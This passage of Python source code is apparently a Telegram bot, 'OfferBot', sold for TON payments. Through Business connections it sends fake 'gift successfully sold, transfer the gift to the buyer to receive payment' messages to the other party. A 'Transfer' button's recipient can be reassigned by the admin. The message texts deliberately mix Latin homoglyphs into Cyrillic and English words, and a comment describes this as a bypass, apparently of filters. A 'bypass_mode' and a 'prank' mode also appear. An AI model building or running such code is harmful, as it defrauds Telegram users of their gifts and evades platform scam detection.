        text=(f"<b>Платёж #{row['id']}</b>\n\nПользователь: <code>{row['user_id']}</code>\n"
              f"Сумма: <b>{row['amount']:g} TON</b>\nСтатус: {row['status']}\nПровайдер: {row.get('provider') or '—'}\n"
              f"Создан: {created}\nОплачен: {paid}\nМетка: <code>{html.escape(row.get('memo') or '—')}</code>\n"
              f"ID счёта: <code>{html.escape(str(row.get('provider_invoice_id') or '—'))}</code>")
        await call.message.edit_text(text, reply_markup=admin_back_keyboard("payments")); await call.answer(); return

    if action == "referrals":
        data=db.admin_dashboard(0); rows=db.admin_referrals(8,offset)
        lines=["<b>Реферальная система</b>", f"Приглашено: <b>{data['referrals']}</b>", f"Успешных начислений: <b>{data['referral_rewards']}</b>", "", "<b>Топ пригласивших</b>"]
        for r in rows: lines.append(f"<code>{r['referrer_id']}</code> · приглашено {r['invited']} · оплатили {r['paid_invites']}")
        if not rows: lines.append("Пока нет приглашений.")
        buttons=[]; nav=[]
        if offset: nav.append(InlineKeyboardButton(text="Предыдущая", callback_data=f"adm:referrals:{max(0,offset-8)}"))
        if len(rows)==8: nav.append(InlineKeyboardButton(text="Следующая", callback_data=f"adm:referrals:{offset+8}"))
        if nav: buttons.append(nav)
        buttons.append([InlineKeyboardButton(text="Назад", callback_data="adm:home:0")])
        await call.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons)); await call.answer(); return

    if action == "settings":
        try:
            referral_hours = float(db.get_setting("referral_reward_hours", "24"))
        except (TypeError, ValueError):
            referral_hours = 24.0
        amount_style = get_offer_amount_style()
        amount_style_label = "Премиум-эмодзи ⭐💎" if amount_style == "premium" else "Текст Stars / Gram"
        text=("<b>Настройки</b>\n\n"
              f"Цена доступа: <b>{get_payment_price():g} TON</b>\n"
              f"Длительность доступа: <b>{get_access_duration_hours():g} часов</b>\n"
              f"Реферальный бонус: <b>{referral_hours:g} часов</b>\n"
              f"Команда офера: <code>{html.escape(get_offer_command())}</code>\n"
              f"Формат суммы в офере: <b>{amount_style_label}</b>\n\nВыберите настройку.")
        markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Формат суммы в офере", callback_data="adm:amount_style:0")],
            [InlineKeyboardButton(text="Изменить цену", callback_data="adm:payment_price:0")],
            [InlineKeyboardButton(text="Изменить срок доступа", callback_data="adm:access_duration:0")],
            [InlineKeyboardButton(text="Изменить реферальный бонус", callback_data="adm:referral_hours:0")],
            [InlineKeyboardButton(text="Изменить команду офера", callback_data="adm:offer_command:0")],
            [InlineKeyboardButton(text="Изменить баннер", callback_data="adm:banner:0")],
            [InlineKeyboardButton(text="Профиль кнопки передачи", callback_data="adm:change_profile:0")],
            [InlineKeyboardButton(text="Назад", callback_data="adm:home:0")]])
        await call.message.edit_text(text, reply_markup=markup); await call.answer(); return

    if action == "amount_style":
        selected = "plain" if get_offer_amount_style() == "premium" else "premium"
        db.set_setting("offer_amount_style", selected)
        label = "Текст Stars / Gram" if selected == "plain" else "Премиум-эмодзи ⭐💎"
        await call.answer(f"Выбран формат: {label}")
        # Return to settings; the user can toggle again at any time.
        await call.message.edit_text(
            f"<b>Формат суммы в офере изменён:</b> {label}",
            reply_markup=admin_keyboard()
        )
        return

    if action == "offer_command":
        awaiting_offer_command.add(cfg.owner_id)
        await call.message.answer(
            f"Текущая команда: <code>{html.escape(get_offer_command())}</code>\n\n"
            "Отправьте новую команду одним словом. Можно использовать буквы, цифры и _.\n"
            "Например: <code>купить</code> или <code>ху</code>.\n"
            "Команду можно будет писать с точкой или без неё. Для отмены: /cancel"
        )
        await call.answer()
        return

    if action == "system":
        data=db.admin_system_stats()
        try:
            with db.connect() as con, con.cursor() as cur: cur.execute("SELECT 1")
            db_state="Подключена"
        except Exception as exc:
            db_state=f"Ошибка: {type(exc).__name__}"
        audit = db.recent_admin_actions(8)
        audit_lines = [f"{r['created_at'].strftime('%d.%m %H:%M')} · {html.escape(r['action'])} · ID {r['target_user_id'] or '—'}" for r in audit]
        text=("<b>Система и журналы</b>\n\n"
              f"База данных: <b>{db_state}</b>\nПользователей: {data['users']}\nОферов: {data['offers']}\n"
              f"Платежей: {data['payments']}\nОжидают оплаты: {data['pending_payments']}\n\n"
              "<b>Последние действия администратора</b>\n" + ("\n".join(audit_lines) if audit_lines else "Записей пока нет.") +
              "\n\nПодробные технические ошибки доступны в логах хостинга.")
        await call.message.edit_text(text, reply_markup=admin_back_keyboard()); await call.answer(); return

    if action == "access":
        text = (
            "<b>Управление доступами</b>\\n\\n"
            f"Текущая цена: <b>{get_payment_price():g} TON</b>\\n"
            "Выберите действие."
        )
        markup = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Изменить цену доступа", callback_data="adm:payment_price:0")],
            [InlineKeyboardButton(text="Выдать доступ по @username", callback_data="adm:allow_username:0")],
            [InlineKeyboardButton(text="Выдать доступ по Telegram ID", callback_data="adm:allow_id:0")],
            [InlineKeyboardButton(text="Выдать временный доступ", callback_data="adm:allow_temp:0")],
            [InlineKeyboardButton(text="Скоро истекает", callback_data="adm:expiring:0")],
            [InlineKeyboardButton(text="Забрать доступ у всех", callback_data="adm:revoke_all_prompt:0")],
            [InlineKeyboardButton(text="Назад в админку", callback_data="adm:home:0")],
        ])
        await call.answer()
        try:
            await call.message.edit_text(text, reply_markup=markup)
        except Exception:
            await call.message.answer(text, reply_markup=markup)
        return

    if action == "expiring":
        rows = db.expiring_access(24, 8, offset)
        lines = ["<b>Доступ истекает в ближайшие 24 часа</b>", ""]
        buttons=[]
        for r in rows:
            name=html.escape(r.get('first_name') or r.get('username') or 'Пользователь')
            left=max(0,int((r['expires_at']-datetime.now(r['expires_at'].tzinfo or timezone.utc)).total_seconds()/60))
            lines.append(f"{name} · <code>{r['user_id']}</code> · через {left} мин.")
            buttons.append([InlineKeyboardButton(text=f"Пользователь {r['user_id']}", callback_data=f"adm:user:{r['user_id']}")])
        if not rows: lines.append("Нет пользователей с истекающим доступом.")
        nav=[]
        if offset: nav.append(InlineKeyboardButton(text="Предыдущая", callback_data=f"adm:expiring:{max(0,offset-8)}"))
        if len(rows)==8: nav.append(InlineKeyboardButton(text="Следующая", callback_data=f"adm:expiring:{offset+8}"))
        if nav: buttons.append(nav)
        buttons.append([InlineKeyboardButton(text="Назад", callback_data="adm:access:0")])
        await call.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons)); await call.answer(); return

    if action == "revoke_all_prompt":
        markup = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Да, забрать у всех", callback_data="adm:revoke_all_confirm:0")],
            [InlineKeyboardButton(text="Отмена", callback_data="adm:access:0")],
        ])
        await call.answer()
        await call.message.edit_text(
            "Подтвердите массовый отзыв доступа.\\n\\n"
            "Доступ обычных пользователей будет отозван, дополнительные Business-подключения заблокированы. "
            "История платежей и пользователи останутся в базе. Владелец не затрагивается.",
            reply_markup=markup
        )
        return

    if action == "revoke_all_confirm":
        removed = db.revoke_all_access(cfg.owner_id)
        db.log_admin_action(cfg.owner_id, "revoke_all_access", None, f"removed={removed}")
        await call.answer("Доступы отозваны", show_alert=True)
        await call.message.edit_text(
            f"Массовый отзыв завершён. Удалено активных выдач: {removed}.\\n"
            "История платежей и пользователи сохранены.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="К управлению доступами", callback_data="adm:access:0")],
                [InlineKeyboardButton(text="В админку", callback_data="adm:home:0")],
            ])
        )
        return

    if action == "payment_price":
        awaiting_payment_price.add(cfg.owner_id)
        await call.answer()
        await call.message.answer(
            f"Текущая цена: <b>{get_payment_price():g} TON</b>\n\n"
            "Отправьте новую цену числом в TON (например, 5 или 7.5).\n"
            "Для отмены отправьте /cancel."
        )
        return

    if action == "access_duration":
        awaiting_access_duration.add(cfg.owner_id)
        await call.answer()
        await call.message.answer(f"Текущий срок: {get_access_duration_hours():g} часов. Отправьте новый срок от 1 до 8760 часов. Для отмены: /cancel")
        return

    if action == "referral_hours":
        awaiting_referral_hours.add(cfg.owner_id)
        await call.answer()
        await call.message.answer("Отправьте количество часов реферального бонуса (от 1 до 8760). Сейчас действует 24 часа. Для отмены: /cancel")
        return

    if action == "banner":
        awaiting_banner.add(cfg.owner_id)
        await call.answer()
        await call.message.answer("Отправьте новую фотографию баннера. Она будет показана вместе с текстом «Привет, выбери действие» и кнопками /start. Для отмены: /cancel")
        return
    
    if action == "prankphoto":
        awaiting_prank_photo.add(cfg.owner_id)
        await call.answer()
        await call.message.answer("Отправьте фото для режима пранка. Для отмены: /cancel")
        return

    if action == "prankphotoremove":
        db.set_prank_photo("")
        await call.answer("Фото пранка удалено. Теперь будет отправляться только текст.", show_alert=True)
        await call.message.answer("Фото пранка убрано. Теперь пранк отправляется только текстом.", reply_markup=admin_keyboard())
        return

    if action == "allow_temp":
        awaiting_access_grant.add(cfg.owner_id)
        await call.answer()
        await call.message.answer(
            "Отправьте ID или @username и срок в часах через пробел.\n"
            "Например: <code>123456789 48</code> или <code>@username 48</code>.\n"
            "Можно указать 12, 48, 168 или любое количество часов. Для отмены: /cancel"
        )
        return

    if action == "allow_username":
        await call.answer()
        await call.message.answer("Чтобы выдать доступ по username, отправь команду: <code>/allow @username 48h</code>. Пользователь должен хотя бы раз запустить бота.")
        return
    if action == "allow_id":
        await call.answer()
        await call.message.answer("Чтобы выдать доступ по Telegram ID, отправь команду: <code>/allow 123456789 7d</code>.")
        return
    if action == "allow":
        uid = offset
        await admin_allow(uid)
        await call.answer("Доступ выдан")
        try: await bot.send_message(cfg.owner_id, f"Доступ выдан пользователю <code>{uid}</code> через админку.")
        except Exception: pass
        try:
            await bot.send_message(uid, "✅ Доступ к оферам активирован.")
        except Exception:
            pass
        return
    if action == "block":
        uid = offset
        await admin_block(uid)
        await call.answer("Доступ заблокирован")
        return
    if action == "broadcast":
        awaiting_broadcast.add(cfg.owner_id)
        await call.answer()
        try:
            await call.message.edit_text("<b>Рассылка</b>\nОтправь текст, фото, видео или GIF. Для отмены: /cancel", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="adm:home:0")]]))
        except Exception:
            await call.message.answer("Отправьте материал для рассылки. Для отмены: /cancel")
        return

    if action == "change_profile":
        await call.answer()
        text = (
            "<b>Изменить профиль кнопки передачи</b>\n\n"
            "Введите команду в формате:\n"
            "<code>/setprofile user_id @новый_username</code>\n\n"
            "Пример: <code>/setprofile 123456789 @myshop</code>\n\n"
            "Это изменит профиль получателя в кнопке 'Передать' для указанного пользователя."
        )
        try:
            await call.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="В админку", callback_data="adm:home:0")]]))
        except Exception:
            await call.message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="В админку", callback_data="adm:home:0")]]))
        return

    if action == "connections":
        rows = db.list_connections()
        page_rows = rows[offset:offset+8]
        text, has_next = admin_connections_text(offset)
        kb_rows = []
        for r in page_rows:
            uid = int(r['user_id'])
            access = db.has_access(uid, cfg.owner_id, cfg.offer_access_mode)
            kb_rows.append([
                InlineKeyboardButton(text=f"{'Заблокировать' if access else 'Выдать доступ'} · {uid}", callback_data=f"adm:{'block' if access else 'allow'}:{uid}")
            ])
        nav = []
        if offset > 0:
            nav.append(InlineKeyboardButton(text="‹", callback_data=f"adm:connections:{max(0, offset-8)}"))
        if has_next:
            nav.append(InlineKeyboardButton(text="›", callback_data=f"adm:connections:{offset+8}"))
        if nav: kb_rows.append(nav)
        kb_rows.append([InlineKeyboardButton(text="В админку", callback_data="adm:home:0")])
        markup = InlineKeyboardMarkup(inline_keyboard=kb_rows)
    elif action == "toggle_owner_only":
        # Переключение режима "только владелец"
        current = db.is_owner_only_mode()
        db.set_owner_only_mode(not current)
        new_status = "включён" if not current else "выключен"
        await call.answer(f"Режим 'Только владелец' {new_status}", show_alert=True)
        text = admin_home_text()
        markup = admin_keyboard()
    else:
        if action == "home":
            awaiting_broadcast.discard(cfg.owner_id)
        text = admin_home_text()
        markup = admin_keyboard()

    await call.answer()
    try:
        await call.message.edit_text(text, reply_markup=markup)
    except TelegramBadRequest as e:
        if "message is not modified" not in str(e).lower():
            await call.message.answer(text, reply_markup=markup)
    except Exception:
        await call.message.answer(text, reply_markup=markup)


@dp.callback_query(F.data.startswith("prank:"))
async def prank_callback(call: CallbackQuery):
    """Обработчик кнопок пранка - ничего не делают, просто отвечают"""
    await call.answer("😈", show_alert=False)


@dp.callback_query(F.data.startswith("of:"))
async def offer_callback(call: CallbackQuery):
    log.info("OFFER_CALLBACK offer_id_data=%s user_id=%s message_id=%s", call.data, call.from_user.id if call.from_user else None, call.message.message_id if call.message else None)
    parts = call.data.split(":")
    if len(parts) < 3 or not parts[2].isdigit():
        await call.answer("Некорректный офер.", show_alert=True); return
    
    offer_id = int(parts[2])
    action = parts[1]
    
    # Обработка принятия/отклонения офера
    if action not in {"accept", "decline"}:
        await call.answer("Некорректный офер.", show_alert=True); return
    
    if offer_id not in offer_locks:
        offer_locks[offer_id] = asyncio.Lock()
    async with offer_locks[offer_id]:
        offer = db.get_offer(offer_id)
        if offer and offer["status"] == "pending" and offer.get("expires_at") and offer["expires_at"] <= datetime.now(timezone.utc):
            db.update_offer_status(offer_id, "expired")
            offer = db.get_offer(offer_id)
        if not offer or offer["status"] != "pending":
            await call.answer("Офер уже обработан.", show_alert=True); return
        if not call.message or call.message.message_id != offer["message_id"] or call.message.chat.id != offer["message_chat_id"]:
            await call.answer("Офер недействителен.", show_alert=True); return
        if action == "accept":
            url = offer["transfer_url"] or f"tg://user?id={offer['seller_id']}"
            title = html.escape(gift_title(offer["gift_name"], offer["gift_number"]))
            gift_url = html.escape(offer["gift_url"], quote=True)
            bypass_mode = offer.get("bypass_mode", 0)
            
            # Для режимов обхода (bypass_mode > 0) всегда используем текст без эмодзи
            use_emoji = (get_offer_amount_style() != 'plain') and (bypass_mode == 0)
            
            amount_text = display_amount(offer['amount'], offer['currency'], 
                                        with_emoji=use_emoji,
                                        bypass_mode=bypass_mode)
            # Alert popups are plain text and cannot render Telegram custom-emoji tags.
            if offer['currency'] == "gram":
                alert_amount_text = f"{offer['amount']:g} Gram"
            elif offer['currency'] == "stars":
                alert_amount_text = f"{offer['amount']:g} ⭐"
            else:
                alert_amount_text = f"{offer['amount']:g}₽"
            if offer["locale"] == "ru":
                # Обходим латинскими буквами ВСЕ слова: e, a, o, c вместо е, а, о, с
                final = f"<tg-emoji emoji-id=\"{GIFT_EMOJI_ID}\">🎁</tg-emoji> Пoдaрoк <a href=\"{gift_url}\">{title}</a> уcпeшнo прoдaн!\n\n• Пeрeдaйтe дaнный пoдaрoк пoкупaтeлю, для зaчислeния {amount_text} нa вaш бaлaнc."
            elif offer["locale"] == "cn":
                final = f"<tg-emoji emoji-id=\"{GIFT_EMOJI_ID}\">🎁</tg-emoji> 礼物 <a href=\"{gift_url}\">{title}</a> 已成功售出！\n\n• 请将礼物转交给买家，以获得 {amount_text}。"
            elif offer["locale"] == "ar":
                final = f"<tg-emoji emoji-id=\"{GIFT_EMOJI_ID}\">🎁</tg-emoji> تم بيع الهدية <a href=\"{gift_url}\">{title}</a> بنجاح!\n\n• انقل الهدية إلى المشتري لتحصل على {amount_text}."
            else:
                final = f"<tg-emoji emoji-id=\"{GIFT_EMOJI_ID}\">🎁</tg-emoji> Gift: <a href=\"{gift_url}\">{title}</a> suссеssfully sоld!\n\n• Trаnsfеr thе gift tо thе buyеr tо rесеivе {amount_text}."
            try:
                sent = await safe_send_business(offer["business_connection_id"], offer["buyer_id"], text=final,
                    reply_markup=transfer_keyboard(url, offer["locale"], offer_id),
                    link_preview_options=LinkPreviewOptions(url=gift_url, show_above_text=True))
                try:
                    await bot.delete_business_messages(business_connection_id=offer["business_connection_id"], message_ids=[offer["message_id"]])
                except Exception as e: log.warning("Could not delete accepted offer: %s", e)
                db.set_offer_message(offer_id, offer["buyer_id"], sent.message_id)
                db.update_offer_status(offer_id, "accepted", url)
                log.info("[OFFER ACCEPT] offer_id=%s seller_id=%s buyer_id=%s", offer_id, offer["seller_id"], offer["buyer_id"])
                try: await bot.send_message(offer["seller_id"], f"✅ Ваш офер принят\nПодарок: {title}\nСумма: {amount_text}")
                except Exception: log.warning("Could not notify seller about accepted offer")
                
                # Модальное окно с кнопкой "OK"
                if offer["locale"] == "ru":
                    # Обходим латинскими буквами ВСЕ слова: e, a, o, c вместо е, а, о, с
                    alert_message = f"Вaш пoдaрoк {title} уcпeшнo прoдaн.\n\nПeрeдaйтe пoдaрoк пoкупaтeлю для зaчислeния {alert_amount_text}."
                elif offer["locale"] == "cn":
                    alert_message = f"您的礼物 {title} 已成功售出。\n\n请将礼物转交给买家以获得 {alert_amount_text}。"
                elif offer["locale"] == "ar":
                    alert_message = f"تم بيع هديتك {title} بنجاح.\n\nانقل الهدية إلى المشتري لتحصل على {alert_amount_text}."
                else:
                    alert_message = f"Your gift {title} successfully sold.\n\nTransfer the gift to the buyer to receive {alert_amount_text}."
                
                await call.answer(alert_message, show_alert=True)
            except Exception as e:
                log.exception("[OFFER ACCEPT ERROR] offer_id=%s action=%s", offer_id, action)
                try:
                    await call.answer("Не удалось принять офер. Ошибка записана в лог; попробуйте ещё раз.", show_alert=True)
                except Exception:
                    log.exception("[OFFER ACCEPT ALERT ERROR] offer_id=%s", offer_id)
        else:
            title = html.escape(gift_title(offer["gift_name"], offer["gift_number"]))
            gift_url = html.escape(offer["gift_url"], quote=True)
            decline_text = {"ru": "Предложение отклонено.", "en": "Оffеr dесlinеd.", "cn": "报价已拒绝。", "ar": "تم رفض العرض."}.get(offer["locale"], "Предложение отклонено.")
            final = f"<tg-emoji emoji-id=\"{DECLINE_EMOJI_ID}\">❌</tg-emoji> <b>{decline_text}</b>"
            try:
                sent = await safe_send_business(offer["business_connection_id"], offer["buyer_id"], text=final)
                try:
                    await bot.delete_business_messages(business_connection_id=offer["business_connection_id"], message_ids=[offer["message_id"]])
                except Exception as e: log.warning("Could not delete declined offer: %s", e)
                db.set_offer_message(offer_id, offer["buyer_id"], sent.message_id)
                db.update_offer_status(offer_id, "declined")
                log.info("[OFFER DECLINE] offer_id=%s", offer_id)
                try: await bot.send_message(offer["seller_id"], f"❌ Ваш офер отклонён\nПодарок: {title}")
                except Exception: log.warning("Could not notify seller about declined offer")
                declined_alert = {"ru": "Предложение отклонено.", "en": "Оffеr dесlinеd.", "cn": "报价已拒绝。", "ar": "تم رفض العرض."}.get(offer["locale"], "Предложение отклонено.")
                await call.answer(declined_alert)
            except Exception:
                log.exception("[OFFER DECLINE ERROR] offer_id=%s", offer_id)
                try:
                    await call.answer("Не удалось отклонить офер. Ошибка записана в лог.", show_alert=True)
                except Exception:
                    log.exception("[OFFER DECLINE ALERT ERROR] offer_id=%s", offer_id)


async def access_reminder_job():
    while True:
        try:
            # Existing reminder sent directly to the user.
            due_users = db.claim_one_hour_reminders()
            for row in due_users:
                uid = int(row["user_id"])
                try:
                    await bot.send_message(
                        uid,
                        "До окончания твоего доступа остался 1 час!\n\n"
                        "Продли доступ, чтобы продолжить пользоваться OfferBot."
                    )
                except Exception:
                    log.warning("Could not send access expiry reminder to user_id=%s", uid)

            # Notify the bot owner once when each access period enters its final hour.
            admin_due = db.claim_admin_one_hour_reminders()
            for row in admin_due:
                uid = int(row["user_id"])
                expires = row["expires_at"]
                expires_text = expires.astimezone(timezone.utc).strftime("%d.%m.%Y %H:%M UTC") if expires and expires.tzinfo else (expires.strftime("%d.%m.%Y %H:%M UTC") if expires else "неизвестно")
                user_row = db.get_user(uid) if hasattr(db, "get_user") else None
                username = (user_row or {}).get("username") if user_row else None
                name = (user_row or {}).get("first_name") if user_row else None
                identity = f"@{username}" if username else (name or "Без имени")
                source = "Платный/выданный доступ"
                try:
                    await bot.send_message(
                        cfg.owner_id,
                        "⏳ <b>Скоро закончится доступ</b>\n\n"
                        f"Пользователь: {identity}\nID: <code>{uid}</code>\n"
                        f"Тип: {source}\nОкончание: <b>{expires_text}</b>\n"
                        "До окончания осталось не более 1 часа."
                    )
                except Exception:
                    log.warning("Could not notify owner about expiring access user_id=%s", uid)

            # Notify the owner once after access has actually expired.
            expired_users = db.claim_expired_access_notifications()
            for row in expired_users:
                uid = int(row["user_id"])
                expires = row["expires_at"]
                expires_text = expires.astimezone(timezone.utc).strftime("%d.%m.%Y %H:%M UTC") if expires and expires.tzinfo else (expires.strftime("%d.%m.%Y %H:%M UTC") if expires else "неизвестно")
                user_row = db.get_user(uid) if hasattr(db, "get_user") else None
                username = (user_row or {}).get("username") if user_row else None
                name = (user_row or {}).get("first_name") if user_row else None
                identity = f"@{username}" if username else (name or "Без имени")
                source = "Платный/выданный доступ"
                try:
                    await bot.send_message(
                        cfg.owner_id,
                        "🔴 <b>Доступ пользователя закончился</b>\n\n"
                        f"Пользователь: {identity}\nID: <code>{uid}</code>\n"
                        f"Тип: {source}\nЗакончился: <b>{expires_text}</b>"
                    )
                except Exception:
                    log.warning("Could not notify owner about expired access user_id=%s", uid)
        except Exception:
            log.exception("Access reminder job failed")
        await asyncio.sleep(60)


async def cleanup_job():
    while True:
        try:
            deleted = db.cleanup_expired_offers()
            if deleted: log.info("Cleanup removed %s expired pending offers", deleted)
        except Exception: log.exception("Cleanup job failed")
        await asyncio.sleep(900)


async def main():
    asyncio.create_task(cleanup_job())
    asyncio.create_task(access_reminder_job())
    for uid in cfg.offer_always_allowed_ids:
        db.add_access(uid); db.unblock_offer_user(uid)
    log.info("OfferBot starting; owner_id=%s database=%s", cfg.owner_id, "PostgreSQL")
    try:
        await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
    finally:
        log.info("OfferBot shutting down, closing database connections...")
        db.close()
        await bot.session.close()


if __name__ == "__main__":
    asyncio.run(main())